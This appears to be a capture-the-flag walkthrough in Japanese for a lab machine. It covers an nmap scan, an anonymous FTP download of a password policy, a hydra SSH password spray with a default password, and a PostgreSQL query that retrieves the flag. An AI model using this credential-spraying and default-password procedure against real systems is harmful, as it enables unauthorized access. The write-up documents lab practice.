# 1.Port Scan
ip=10.129.115.133

`nmap -sC -sV $ip`

![fe2b16b55b9f45992b9257128923effd.png](../_resources/fe2b16b55b9f45992b9257128923effd.png)

# 2.FTP Connect

`ftp $ip`

anonymousでloginする

name: anonymous

![dfa3aac7d0d864d24c50d60e46e342a0.png](../_resources/dfa3aac7d0d864d24c50d60e46e342a0.png)

mail_backupに2つのファイルがあることを確認

`cd mail_backup`

dir

get password_policy.pdf

get welcome_28112022

![74cd26d7f4e05405760aed3370dd5142.png](../_resources/74cd26d7f4e05405760aed3370dd5142.png)

入手したパスワードポリシーにデフォルトのパスワードが記載されている。

password_policy.pdf

![c2ef90d85b1f9303886116ec5b54909b.png](../_resources/c2ef90d85b1f9303886116ec5b54909b.png)


新しくチームに配属されたメンバーに対して送られたメールを入手

![2b3087a6548cae73a1de75c6e3c55351.png](../_resources/2b3087a6548cae73a1de75c6e3c55351.png)

# 3. Hydra

メールからusernames.txtを作成

`echo "optimus\n""albert\n""andreas\n""christine\n""maria\n" > usernames.txt`  

![5df5d011ebc8a24d3bc33297c035ee26.png](../_resources/5df5d011ebc8a24d3bc33297c035ee26.png)

ヒュドラでパスワードクラックを実施

`hydra -L usernames.txt -p 'funnel123#!#' 10.129.115.133 ssh`

`login: christine`
`password: funnel123#!#`

![702523a49102c3f11a7940de57f14eb2.png](../_resources/702523a49102c3f11a7940de57f14eb2.png)

sshで接続

![6369f256d375df2566d58e4b50b83ad2.png](../_resources/6369f256d375df2566d58e4b50b83ad2.png)

postgresqlをport5432を使用している事を確認

ss -tln 

![063e462b7df2fa0cd86f7d01a85e395d.png](../_resources/063e462b7df2fa0cd86f7d01a85e395d.png)

ss -tl

![aea4639f43ea6629388233d962707ec5.png](../_resources/aea4639f43ea6629388233d962707ec5.png)

ローカルマシンでポート1234を開けている事を確認

ss -tlpn

![00d5de00a7f3b4efa968ebd640a5eda1.png](../_resources/00d5de00a7f3b4efa968ebd640a5eda1.png)

# 4.Flag get

PostgreSQLに接続。flagを入手

`psql -U christine -h localhost -p 1234`

\l

\c secrets

\dt

SELECT * FROM flag;

![619651207f132284b358c3d00743a9a9.png](../_resources/619651207f132284b358c3d00743a9a9.png)
